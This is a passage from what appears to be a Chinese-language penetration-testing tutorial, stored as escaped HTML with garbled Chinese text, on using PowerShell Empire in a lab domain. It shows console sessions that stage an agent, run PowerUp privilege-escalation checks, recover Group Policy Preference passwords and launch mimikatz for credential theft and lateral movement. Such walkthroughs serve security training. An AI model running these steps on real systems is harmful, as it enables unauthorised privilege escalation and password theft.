&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Sending agent &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;stage 2&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; to D6XC87Y9 at 172.16.0.105
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: XR6MK1Y3&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; back
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: agents&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; list
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ææƒæˆåŠŸåä¼šå‡ºç°æ˜Ÿå·ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/powershell//13.png&#34; alt=&#34;13&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;powerup&#34;&gt;PowerUP&lt;/h3&gt;
&lt;p&gt;Empireå†…ç½®äº†PowerUPçš„éƒ¨åˆ†å·¥å…·ï¼Œä¸»è¦æ˜¯ç”¨äºææƒæ¯”è¾ƒå¤šï¼Œä½¿ç”¨&lt;code&gt;allchecks&lt;/code&gt;æ¨¡å—ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Job started: MHAKG5
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: VUXT7WBZ&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; usemodule powershell/privesc/powerup/allchecks
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set Agent to VUXT7WBZ
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Author       @harmj0y                                                           
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Background   True                                                               
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Comments     https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Description  Runs all current checks &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; Windows privesc vectors.               
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Language     powershell                                                         
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Name         powershell/privesc/powerup/allchecks                               
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; NeedsAdmin   False                                                              
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; OpsecSafe    True                                                               
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Software     http://attack.mitre.org/software/S0194                             
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Techniques   http://attack.mitre.org/techniques/T1087                           
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              http://attack.mitre.org/techniques/T1038                           
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              http://attack.mitre.org/techniques/T1031                           
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              http://attack.mitre.org/techniques/T1034                           
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              http://attack.mitre.org/techniques/T1057                           
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              http://attack.mitre.org/techniques/T1012                           
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”ŒRecord Optionsâ”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Name           â”‚ Value      â”‚ Required â”‚ Description                         â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Agent          â”‚ VUXT7WBZ   â”‚ True     â”‚ Agent to run module on.             â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ OutputFunction â”‚ Out-String â”‚ False    â”‚ PowerShell&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s output &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; to use â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                â”‚            â”‚          â”‚ &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Out-String&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;ConvertTo-Json&amp;#34;&lt;/span&gt;,    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                â”‚            â”‚          â”‚ &lt;span class=&#34;s2&#34;&gt;&amp;#34;ConvertTo-Csv&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;ConvertTo-Html&amp;#34;&lt;/span&gt;,  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                â”‚            â”‚          â”‚ &lt;span class=&#34;s2&#34;&gt;&amp;#34;ConvertTo-Xml&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.                   â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/privesc/powerup/allchecks&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; execute
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Tasked VUXT7WBZ to run Task &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Task &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Job started: 6VRS1X
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Task &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt; results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Running Invoke-AllChecks
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Checking &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; user is in a &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; group with administrative privileges...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User is in a &lt;span class=&#34;nb&#34;&gt;local&lt;/span&gt; group that grants administrative privileges!
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Run a BypassUAC attack to elevate privileges to admin.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;gpp&#34;&gt;GPP&lt;/h3&gt;
&lt;p&gt;GPPæ˜¯æŒ‡ç»„ç­–ç•¥é¦–é€‰é¡¹ï¼ˆGroup Policy Preferenceï¼‰ï¼ŒGPPé€šè¿‡æ“ä½œç»„ç­–ç•¥å¯¹è±¡GPOï¼ˆGroup Policy Objectï¼‰å¯¹åŸŸä¸­çš„èµ„æºè¿›è¡Œç®¡ç†ã€‚Freebufçš„è¿™ç¯‡æ–‡ç« http://www.freebuf.com/vuls/92016.htmlè®²äº†GPPçš„åº”ç”¨åœºæ™¯å’Œä¸ä¹‹å¯¹åº”çš„å®‰å…¨é—®é¢˜ã€‚&lt;/p&gt;
&lt;p&gt;ç®€å•æ¥è¯´å°±æ˜¯ï¼Œå‡ºäºæƒ³æ›´æ–°æ¯å°ä¸»æœºä¸Šæœ¬åœ°è´¦æˆ·å¯†ç çš„ç›®çš„ï¼Œåˆ©ç”¨GPPå¯ä»¥æŒ‡å®šæŸä¸ªåŸŸè´¦æˆ·ä¸ºæ‰€æœ‰è®¡ç®—æœºçš„æœ¬åœ°è®¡ç®—æœºç®¡ç†è´¦æˆ·ã€‚è€Œè¿™ä¸ªè´¦å·ä¿¡æ¯å­˜å‚¨åœ¨&lt;code&gt;\\[Domain Controller]\SYSVOL\[Domain]\Policies&lt;/code&gt;ä¸­çš„æŸä¸ªGrouop.xmlä¸­ï¼Œå…¶ä¸­çš„cpasswordä¸ºAESåŠ å¯†å€¼ã€‚ä½†åœ¨ADä¸­çš„æ‰€æœ‰ç”¨æˆ·éƒ½å¯ä»¥è¯»å–Group.xmlï¼Œå¯¹äºAESçš„å¯¹ç§°åŠ å¯†ï¼Œåœ¨å¾®è½¯çš„MSDNä¸Šå¯ä»¥æŸ¥åˆ°cpasswordä½¿ç”¨çš„å›ºå®šç§˜é’¥ï¼ˆhttps://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspxï¼‰ï¼Œè¿™æ— ç–‘å°±æ˜¯åœ¨æ¸—é€äººå‘˜é¢å‰çš„è£¸å¥”ã€‚&lt;/p&gt;
&lt;p&gt;å…·ä½“å¯ä»¥å‚è€ƒxq17å¸ˆå‚…çš„æ–‡ç« &lt;a href=&#34;https://xz.aliyun.com/t/7784&#34;&gt;æµ…æåŸŸæ¸—é€ä¸­çš„ç»„ç­–ç•¥åˆ©ç”¨&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;GPPæ¼æ´åªåœ¨2008æ²¡æ‰“è¡¥ä¸ç‰ˆæœ¬ä¸Šå­˜åœ¨ï¼Œè¶…è¿‡2008ç‰ˆæœ¬çš„ç³»ç»Ÿæ˜¯æ²¡åŠæ³•å†™å…¥å¯†ç çš„ã€‚&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;å› ä¸ºæˆ‘çš„åŸŸç¯å¢ƒæ˜¯widows server 2016å·²ç»æ‰“è¡¥ä¸äº†ï¼Œæ‰€ä»¥ä¸èƒ½è®¾ç½®å¯†ç ï¼Œä¸‹é¢æ˜¯è¿™ä¸ªåŠŸèƒ½çš„åˆ©ç”¨å‘½ä»¤ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: D6XC87Y9&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; usemodule powershell/privesc/gpp
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Set Agent to D6XC87Y9
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Author       @obscuresec                                                            
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Background   True                                                                   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Comments     https://github.com/mattifestation/PowerSploit/blob/master/Exfiltration 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              /Get-GPPPassword.ps1                                                   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Description  Retrieves the plaintext password and other information &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; accounts    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;              pushed through Group Policy Preferences.                               
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Language     powershell                                                             
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Name         powershell/privesc/gpp                                                 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; NeedsAdmin   False                                                                  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; OpsecSafe    True                                                                   
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; Techniques   http://attack.mitre.org/techniques/T1003                               
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”ŒRecord Optionsâ”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Name           â”‚ Value      â”‚ Required â”‚ Description                         â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ Agent          â”‚ D6XC87Y9   â”‚ True     â”‚ Agent to run module on.             â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚ OutputFunction â”‚ Out-String â”‚ False    â”‚ PowerShell&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s output &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; to use â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                â”‚            â”‚          â”‚ &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Out-String&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;ConvertTo-Json&amp;#34;&lt;/span&gt;,    â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                â”‚            â”‚          â”‚ &lt;span class=&#34;s2&#34;&gt;&amp;#34;ConvertTo-Csv&amp;#34;&lt;/span&gt;, &lt;span class=&#34;s2&#34;&gt;&amp;#34;ConvertTo-Html&amp;#34;&lt;/span&gt;,  â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”‚                â”‚            â”‚          â”‚ &lt;span class=&#34;s2&#34;&gt;&amp;#34;ConvertTo-Xml&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.                   â”‚
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: usemodule/powershell/privesc/gpp&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; execute
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Tasked D6XC87Y9 to run Task &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Task &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Job started: KGD9NX
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Task &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Get-GPPPassword completed
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;æ¨ªå‘æ¸—é€&#34;&gt;æ¨ªå‘æ¸—é€&lt;/h2&gt;
&lt;h3 id=&#34;ä»¤ç‰Œçªƒå–&#34;&gt;ä»¤ç‰Œçªƒå–&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;æœ¬èŠ‚çš„ç¯å¢ƒï¼šæ”»å‡»æœºæ˜¯kaliï¼ˆempireï¼‰ï¼Œå®¢æˆ·æœºæ˜¯Windows7å’ŒWindows  server 2019 ï¼Œç”¨æˆ·åˆ†åˆ«ä¸ºsc92nï¼ˆWindowsæœ¬åœ°ç®¡ç†å‘˜ï¼‰ã€testuserï¼ˆhackçš„åŸŸç”¨æˆ·ï¼Œåœ¨åŸŸç®¡ç†ç»„ï¼‰&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;å½“æˆ‘ä»¬æ‹¿åˆ°æœåŠ¡å™¨æƒé™ï¼Œè€Œä¸”æ˜¯ç®¡ç†å‘˜çš„æƒé™ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨å†…ç½®çš„mimikatzè·å–å¯†ç ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: agents&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; interact D6XC87Y9
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Empire: D6XC87Y9&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &amp;gt; mimikatz
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Tasked D6XC87Y9 to run Task &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Task &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Job started: BTUVWZ
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Task &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; results received
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Hostname: WIN-JH8N3KV3OQ0.hack.lab / S-1-5-21-733602728-4270550081-3256311297
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  .#####.   mimikatz 2.2.0 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;x64&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;#19041 Jun  9 2021 18:55:28&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; .## ^ &lt;span class=&#34;c1&#34;&gt;##.  &amp;#34;A La Vie, A L&amp;#39;Amour&amp;#34; - (oe.eo)&lt;/span&gt;
